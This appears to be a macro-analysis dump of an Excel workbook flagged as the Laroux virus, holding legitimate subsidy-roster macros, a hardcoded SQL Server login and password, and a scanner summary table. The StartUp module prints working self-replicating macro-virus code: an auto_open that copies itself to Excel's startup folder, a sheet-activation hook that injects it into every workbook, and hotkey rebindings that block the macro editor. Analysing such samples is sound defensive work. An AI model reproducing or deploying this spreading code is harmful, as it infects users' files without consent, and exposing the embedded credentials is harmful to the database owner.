        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Range("A1").Select
    
End Sub
Public Sub 二代身份证国标检验()
    
'    Columns("A:A").ColumnWidth = 9.13
'    Columns("B:B").ColumnWidth = 22.63
'    Columns("B:B").ColumnWidth = 21.88
    Range("N2").Select
    Selection.FormulaArray = _
        "=IF(MID(RC[-10],18,1)=MID(""10X98765432"",MOD(SUM(MID(RC[-10],ROW(R1:R17),1)*2^(18-ROW(R1:R17))),11)+1,1),IF((RC[1]=""正确"")*(RC[2]=""正确""),""正确"",""错误！""),""错误！"")"
    Selection.AutoFill Destination:=Range("N2:N" & Range("B65536").End(xlUp).Row), Type:=xlFillDefault
        
    Range("O2").Select
    Selection.FormulaArray = _
        "=IF((MID(RC[-11],11,2)*1)=0,""月份错误！"",IF((MID(RC[-11],11,2)*1)>12,""月份错误！"",""正确""))"
     Selection.AutoFill Destination:=Range("O2:O" & Range("B65536").End(xlUp).Row), Type:=xlFillDefault
        
    Range("P2").Select
    Selection.FormulaArray = _
        "=IF((MID(RC[-12],13,2)*1)=0,""日期错误！"",IF(RC[3]=""错误！"",""日期错误！"",IF((MID(RC[-12],13,2)*1)>31,""日期错误！"",""正确"")))"
     Selection.AutoFill Destination:=Range("P2:P" & Range("B65536").End(xlUp).Row), Type:=xlFillDefault
        
    Range("Q2").Select
    Selection.FormulaArray = "=MID(RC[-13],11,2)*1"
     Selection.AutoFill Destination:=Range("Q2:Q" & Range("B65536").End(xlUp).Row), Type:=xlFillDefault
    
    Range("R2").Select
    Selection.FormulaArray = "=MID(RC[-14],13,2)*1"
     Selection.AutoFill Destination:=Range("R2:R" & Range("B65536").End(xlUp).Row), Type:=xlFillDefault
    
    Range("S2").Select
    Selection.FormulaArray = _
        "=IF(RC[-2]<>2,""未"",IF(RC[-1]>IF(RC[1]=""平年"",28,29),""错误！"",""正确""))"
     Selection.AutoFill Destination:=Range("S2:S" & Range("B65536").End(xlUp).Row), Type:=xlFillDefault
        
    Range("T2").Select
    Selection.FormulaArray = _
        "=IF(MONTH(DATE(MID(RC[-16],7,4),2,29))=2,""闰年"",""平年"")"
     Selection.AutoFill Destination:=Range("T2:T" & Range("B65536").End(xlUp).Row), Type:=xlFillDefault
        
    
    Range("N2:N" & Range("B65536").End(xlUp).Row).Select
    Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Columns("O:T").Select
    Selection.ClearContents
    Range("A2").Select
    Range("A1").Select
   '  ActiveSheet.Protect DrawingObjects:=True, Contents:=True, Scenarios:=True _
   '     , AllowFormattingColumns:=True, AllowFormattingRows:=True, AllowSorting:= _
   '     True, AllowFiltering:=True
        
   ' Range("N1").Select
    ActiveCell.FormulaR1C1 = "审核结果"
End Sub
Public Sub 自动填写性别()
ActiveSheet.EnableSelection = xlUnlockedCells
    ActiveSheet.Unprotect
    Range("C2").Select
    ActiveCell.FormulaR1C1 = "=IF(MOD(MID(RC[1],17,1),2)=1,""男"",""女"")"
    Selection.AutoFill Destination:=Range("C2:C" & Range("A65536").End(xlUp).Row), Type:=xlFillDefault
     Range("C2:C" & Range("B65536").End(xlUp).Row).Select
    Selection.Copy
    Range("C2").Select
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
      
    Range("A1").Select
   '  Cells.Select
   ' Selection.Locked = False
   ' Selection.FormulaHidden = False
   ' Columns("A:A").Select
   ' Selection.Locked = True
   ' Selection.FormulaHidden = False
   ' Range("A1").Select
   ' ActiveSheet.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
   '     False, AllowFormattingColumns:=True, AllowFormattingRows:=True, _
   '     AllowSorting:=True, AllowFiltering:=True
End Sub
Public Sub 自动填写开户银行()
ActiveSheet.EnableSelection = xlUnlockedCells
    ActiveSheet.Unprotect
    Range("K2").Select
    ActiveCell.FormulaR1C1 = "邮政银行"
    Selection.AutoFill Destination:=Range("K2:K" & Range("A65536").End(xlUp).Row), Type:=xlFillDefault
     Range("K2:K" & Range("B65536").End(xlUp).Row).Select
    Selection.Copy
    Range("K2").Select
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
      
    Range("A1").Select
   '  Cells.Select
   ' Selection.Locked = False
   ' Selection.FormulaHidden = False
    'Columns("A:A").Select
    'Selection.Locked = True
    'Selection.FormulaHidden = False
    'Range("A1").Select
    'ActiveSheet.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
    '    False, AllowFormattingColumns:=True, AllowFormattingRows:=True, _
    '    AllowSorting:=True, AllowFiltering:=True
End Sub
Public Sub 自动填写家庭住址()
ActiveSheet.EnableSelection = xlUnlockedCells
    ActiveSheet.Unprotect
    Dim cnn As New ADODB.Connection
    Dim rs As New ADODB.Recordset
    Dim ws As Worksheet
    Dim SQL As String, mydata As String, mytable As String
    Dim i As Long, j As Long
    Set ws = ThisWorkbook.ActiveSheet    '指定要复制查询数据的工作表
    'ws.Cells.Clear    '清除工作表的所有数据
    mydata = "fimp"      '指定数据库
    mytable = "t_sn_category"     '指定数据表
    'dwdmxx = InputBox("请输入单位代码（长度为9位）", "单位代码", "")
        '建立与SQL Server数据库服务器上指定数据库的连接
    cnn.ConnectionString = "Provider=SQLOLEDB;" _
        & "User ID=hnxc;" _
        & "Password=hnxchnxc;" _
        & "Data Source=10.105.135.9;" _
        & " Initial Catalog=" & mydata
    cnn.Open
    '执行SQL语句创建指定数据表的查询记录集
    SQL = "select category_code,category_name from fimp.hnxc.t_sn_category"
    Set rs = cnn.Execute(SQL)
    '复制字段名
    For i = 0 To rs.Fields.Count - 1
        ws.Cells(1, i + 1) = rs.Fields(i).Name
        ws.Cells(1, i + 1).Font.Bold = True
    Next i
    '复制全部记录数据
    ws.Range("N2").CopyFromRecordset rs
    '字段设置列宽至合适的宽度
    ws.Columns.AutoFit
    '关机记录集以及与数据库的连接
    rs.Close
    cnn.Close
    Set rs = Nothing
    Set cnn = Nothing
    Set ws = Nothing
   Range("A1").Select
   
   Range("P2").Select
    ActiveCell.FormulaR1C1 = "=LEFT(RC[-15],9)"
    Selection.AutoFill Destination:=Range("P2:P" & Range("A65536").End(xlUp).Row), Type:=xlFillDefault
     Range("P2:P" & Range("B65536").End(xlUp).Row).Select
     Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Range("Q2").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "=LEFT(RC[-16],12)"
    Selection.AutoFill Destination:=Range("Q2:Q" & Range("A65536").End(xlUp).Row), Type:=xlFillDefault
     Range("Q2:Q" & Range("B65536").End(xlUp).Row).Select
    Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Range("R2").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "=LEFT(RC[-17],15)"
    Selection.AutoFill Destination:=Range("R2:R" & Range("A65536").End(xlUp).Row), Type:=xlFillDefault
     Range("R2:R" & Range("B65536").End(xlUp).Row).Select
    Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Columns("R:R").EntireColumn.AutoFit
    Range("E2").Select
    Application.CutCopyMode = False
        ActiveCell.FormulaR1C1 = _
        "=VLOOKUP(RC[11],C[9]:C[10],2,0)&VLOOKUP(RC[12],C[9]:C[10],2,0)&VLOOKUP(RC[13],C[9]:C[10],2,0)"
    Selection.AutoFill Destination:=Range("E2:E" & Range("A65536").End(xlUp).Row), Type:=xlFillDefault
     Range("E2:E" & Range("B65536").End(xlUp).Row).Select
    Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Range("N:R").Select
    Selection.ClearContents
        
        
    Range("A1").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "对象代码"
    Range("B1").Select
    ActiveCell.FormulaR1C1 = "对象姓名"
    Range("A1").Select
    'Cells.Select
    'Selection.Locked = False
    'Selection.FormulaHidden = False
    'Columns("A:A").Select
    'Selection.Locked = True
    'Selection.FormulaHidden = False
    'Range("A1").Select
    'ActiveSheet.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
    '    False, AllowFormattingColumns:=True, AllowFormattingRows:=True, _
    '    AllowSorting:=True, AllowFiltering:=True
   End Sub
Public Sub 审核()

Range("N2").Select
    ActiveCell.FormulaR1C1 = _
        "=IF(OR(RC[-11]=""男"",RC[-11]=""女""),"""",""性别填写有误，"")"
    Selection.AutoFill Destination:=Range("N2:N" & Range("A65536").End(xlUp).Row), Type:=xlFillDefault
    Range("N2:N" & Range("B65536").End(xlUp).Row).Select
     Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Range("O2").Select
    ActiveCell.FormulaR1C1 = "=IF(RC[-7]>0,"""",""家庭人口数应大于0,"")"
    Selection.AutoFill Destination:=Range("O2:O" & Range("A65536").End(xlUp).Row), Type:=xlFillDefault
    Range("O2:O" & Range("B65536").End(xlUp).Row).Select
     Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
        Range("P2").Select
    ActiveCell.FormulaR1C1 = _
        "=IF(AND(RC[-8]=INT(RC[-8]),RC[-7]=INT(RC[-7]),RC[-6]=INT(RC[-6])),"""",""人口数和劳动力数均应为整数，"")"
    Selection.AutoFill Destination:=Range("P2:P" & Range("A65536").End(xlUp).Row), Type:=xlFillDefault
    Range("P2:P" & Range("B65536").End(xlUp).Row).Select
     Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Range("Q2").Select
    ActiveCell.FormulaR1C1 = _
        "=IF(RC[-9]>=RC[-8]+RC[-7],"""",""家庭人口数不能小于外出务工劳动力数与在家务农劳动力数之和，"")"
    Selection.AutoFill Destination:=Range("Q2:Q" & Range("A65536").End(xlUp).Row), Type:=xlFillDefault
    Range("Q2:Q" & Range("B65536").End(xlUp).Row).Select
     Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Range("R2").Select
    ActiveCell.FormulaR1C1 = "=RC[-4]&RC[-3]&RC[-2]&RC[-1]"
    Selection.AutoFill Destination:=Range("R2:R" & Range("A65536").End(xlUp).Row), Type:=xlFillDefault
    Range("R2:R" & Range("B65536").End(xlUp).Row).Select
     Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Range("N:Q").Select
    Selection.ClearContents
    Columns("R:R").Select
    Application.CutCopyMode = False
    Selection.Cut
    Columns("N:N").Select
    ActiveSheet.Paste
    Range("A1").Select
    Range("N1").Select
    ActiveCell.FormulaR1C1 = "审核结果"

End Sub

   
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Laroux.zc-1ede8bc131589e615db7205d77a8e6c3bc7b33e7f5540eb5d37267f1e3fb985a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO 模块5.bas 
in file: Virus.MSExcel.Laroux.zc-1ede8bc131589e615db7205d77a8e6c3bc7b33e7f5540eb5d37267f1e3fb985a - OLE stream: '_VBA_PROJECT_CUR/VBA/模块5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Macro5()
Attribute Macro5.VB_Description = "宏由 李强 录制，时间: 2012-8-20"
Attribute Macro5.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Macro5 Macro
' 宏由 李强 录制，时间: 2012-8-20
'

'
    ActiveSheet.Protect DrawingObjects:=True, Contents:=True, Scenarios:=True _
        , AllowFormattingColumns:=True, AllowFormattingRows:=True, AllowSorting:= _
        True, AllowFiltering:=True
    
End Sub
Sub Macro6()
Attribute Macro6.VB_Description = "宏由 李强 录制，时间: 2012-8-20"
Attribute Macro6.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Macro6 Macro
' 宏由 李强 录制，时间: 2012-8-20
'

'
    Range("N2").Select
    ActiveCell.FormulaR1C1 = _
        "=IF(OR(RC[-11]=""男"",RC[-11]=""女""),"""",""性别填写有误，"")"
    Selection.AutoFill Destination:=Range("N2:N23"), Type:=xlFillDefault
    Range("N2:N23").Select
    Range("O2").Select
    ActiveCell.FormulaR1C1 = "=IF(RC[-7]>0,"""",""家庭人口数应大于0,"")"
    Selection.AutoFill Destination:=Range("O2:O23"), Type:=xlFillDefault
    Range("O2:O23").Select
    Range("P2").Select
    ActiveCell.FormulaR1C1 = _
        "=IF(AND(RC[-8]=INT(RC[-8]),RC[-7]=INT(RC[-7]),RC[-6]=INT(RC[-6])),"""",""人口数和劳动力数均应为整数，"")"
    Selection.AutoFill Destination:=Range("P2:P23"), Type:=xlFillDefault
    Range("P2:P23").Select
    Range("Q2").Select
    ActiveCell.FormulaR1C1 = _
        "=IF(RC[-9]>=RC[-8]+RC[-7],"""",""家庭人口数不能小于外出务工劳动力数与在家务农劳动力数之和，"")"
    Selection.AutoFill Destination:=Range("Q2:Q23"), Type:=xlFillDefault
    Range("Q2:Q23").Select
    Range("R2").Select
    ActiveCell.FormulaR1C1 = "=RC[-4]&RC[-3]&RC[-2]&RC[-1]"
    Selection.AutoFill Destination:=Range("R2:R23"), Type:=xlFillDefault
    Range("R2:R23").Select
    Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Columns("N:Q").Select
    Application.CutCopyMode = False
    Selection.Delete Shift:=xlToLeft
    Range("A1").Select
End Sub
Sub Macro7()
Attribute Macro7.VB_Description = "宏由 李强 录制，时间: 2012-8-20"
Attribute Macro7.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Macro7 Macro
' 宏由 李强 录制，时间: 2012-8-20
'

'
    Cells.Select
    Selection.ClearContents
End Sub
Sub Macro8()
Attribute Macro8.VB_Description = "宏由 李强 录制，时间: 2012-8-20"
Attribute Macro8.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Macro8 Macro
' 宏由 李强 录制，时间: 2012-8-20
'

'
    Cells.Select
    Selection.Locked = False
    Selection.FormulaHidden = False
    Columns("A:B").Select
    Selection.Locked = True
    Selection.FormulaHidden = False
    Range("A1").Select
    ActiveSheet.Protect DrawingObjects:=False, Contents:=True, Scenarios:= _
        False, AllowFormattingColumns:=True, AllowFormattingRows:=True, _
        AllowSorting:=True, AllowFiltering:=True
    ActiveSheet.EnableSelection = xlNoRestrictions
    ActiveSheet.Unprotect
End Sub
-------------------------------------------------------------------------------
VBA MACRO 模块4.bas 
in file: Virus.MSExcel.Laroux.zc-1ede8bc131589e615db7205d77a8e6c3bc7b33e7f5540eb5d37267f1e3fb985a - OLE stream: '_VBA_PROJECT_CUR/VBA/模块4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Macro3()
Attribute Macro3.VB_Description = "宏由 李强 录制，时间: 2012-8-20"
Attribute Macro3.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Macro3 Macro
' 宏由 李强 录制，时间: 2012-8-20
'

'
    Range("P2").Select
    ActiveCell.FormulaR1C1 = "=LEFT(RC[-15],9)"
    Range("P2").Select
    Columns("P:P").ColumnWidth = 10
    Selection.AutoFill Destination:=Range("P2:P6914")
    Range("P2:P6914").Select
    Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Range("Q2").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "=LEFT(RC[-16],12)"
    Range("Q2").Select
    Selection.AutoFill Destination:=Range("Q2:Q6914")
    Range("Q2:Q6914").Select
    Columns("Q:Q").EntireColumn.AutoFit
    Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Range("R2").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "=LEFT(RC[-17],15)"
    Range("R2").Select
    Selection.AutoFill Destination:=Range("R2:R6914")
    Range("R2:R6914").Select
    Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Columns("R:R").EntireColumn.AutoFit
    Range("E2").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "=VLOOKUP(RC[11],C[9]:C[10],2,0)"
    ActiveCell.FormulaR1C1 = _
        "=VLOOKUP(RC[11],C[9]:C[10],2,0)&VLOOKUP(RC[12],C[9]:C[10],2,0)&VLOOKUP(RC[13],C[9]:C[10],2,0)"
    Selection.AutoFill Destination:=Range("E2:E459")
    Range("E2:E459").Select
    Selection.Copy
    Selection.PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks _
        :=False, Transpose:=False
    Range("A1").Select
    Application.CutCopyMode = False
    ActiveCell.FormulaR1C1 = "代码"
    Range("B1").Select
    ActiveCell.FormulaR1C1 = "姓名"
    Range("A1").Select
End Sub
Sub Macro4()
Attribute Macro4.VB_Description = "宏由 李强 录制，时间: 2012-8-20"
Attribute Macro4.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Macro4 Macro
' 宏由 李强 录制，时间: 2012-8-20
'

'
    Columns("N:R").Select
    Selection.Delete Shift:=xlToLeft
    Range("A1").Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO 模块3.bas 
in file: Virus.MSExcel.Laroux.zc-1ede8bc131589e615db7205d77a8e6c3bc7b33e7f5540eb5d37267f1e3fb985a - OLE stream: '_VBA_PROJECT_CUR/VBA/模块3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Macro1()
Attribute Macro1.VB_Description = "宏由 李强 录制，时间: 2012-8-21"
Attribute Macro1.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Macro1 Macro
' 宏由 李强 录制，时间: 2012-8-21
'

'
    Columns("N:N").Select
    Selection.Copy
    Columns("N:N").Select
    Application.CutCopyMode = False
    Selection.Cut
    Columns("M:M").Select
    ActiveSheet.Paste
End Sub
-------------------------------------------------------------------------------
VBA MACRO 模块6.bas 
in file: Virus.MSExcel.Laroux.zc-1ede8bc131589e615db7205d77a8e6c3bc7b33e7f5540eb5d37267f1e3fb985a - OLE stream: '_VBA_PROJECT_CUR/VBA/模块6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Macro2()
Attribute Macro2.VB_Description = "宏由 李强 录制，时间: 2012-8-22"
Attribute Macro2.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Macro2 Macro
' 宏由 李强 录制，时间: 2012-8-22
'

'
    Columns("B:B").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入姓名"
        .ErrorTitle = ""
        .InputMessage = _
        "此处录入补贴对象姓名，姓名应由汉字组成，不得包含空格、数字、括号等任何非汉字符号。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("D:D").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入身份证号"
        .ErrorTitle = ""
        .InputMessage = _
        "此处录入补贴对象的二代身份证号。二代身份证号长度为18位，前6位为行政区划码，接下来8位为持证人出生时间，倒数第二位表示对象性别，奇数代表男性，偶数代表女性。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("E:E").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入补贴对象地址"
        .ErrorTitle = ""
        .InputMessage = _
        "此处录入补贴对象地址。一般应录入对象居住址，也可能录入行政区划所在地，可以用工具中的自动填写功能批量填写补贴所在地的行政区划地址，但应用此工具时会自动将所有对象的地址重写且不可恢复。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("F:F").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入补贴对象邮政编码"
        .ErrorTitle = ""
        .InputMessage = "此处填写邮政编码，澧县的邮政编码为4155XX。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("G:G").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入补贴对象联系电话"
        .ErrorTitle = ""
        .InputMessage = _
        "此处填写补贴对象联系电话，一般要填写本人的座机电话号码或手机电话号码，如本人没有联系电话的，也可以填写村、组电话号码或其他可以联系到补贴对象的电话号码。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("H:H").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入家庭人口数"
        .ErrorTitle = ""
        .InputMessage = "此处填写补贴对象家庭人口数。家庭人口数应为大于0的整数，且不得小于外出务工劳动力数与在家务农劳动力数之和。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("I:I").Select
    ActiveCell.FormulaR1C1 = "处出务工劳动力数"
    Columns("I:I").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入外出务工劳动力数"
        .ErrorTitle = ""
        .InputMessage = "此处填写补贴对象家庭中常年在外劳动力数，偶尔外出打短工的不在此列。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("J:J").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入在家务农劳动力数"
        .ErrorTitle = ""
        .InputMessage = "此处填写在家务农劳动力数。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
    Columns("K:K").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateInputOnly, AlertStyle:=xlValidAlertStop, Operator _
        :=xlBetween
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = "录入开户银行名称"
        .ErrorTitle = ""
        .InputMessage = "些处填写开户银行名称，澧县全部在邮政银行开户，可以用工具提供的自动填写开户银行命令批量填写。"
        .ErrorMessage = ""
        .IMEMode = xlIMEModeNoControl
        .ShowInput = True
        .ShowError = True
    End With
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Laroux.zc-1ede8bc131589e615db7205d77a8e6c3bc7b33e7f5540eb5d37267f1e3fb985a - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Laroux.zc-1ede8bc131589e615db7205d77a8e6c3bc7b33e7f5540eb5d37267f1e3fb985a - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartU
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |10.105.135.9        |IPv4 address                                 |
+----------+--------------------+---------------------------------------------+

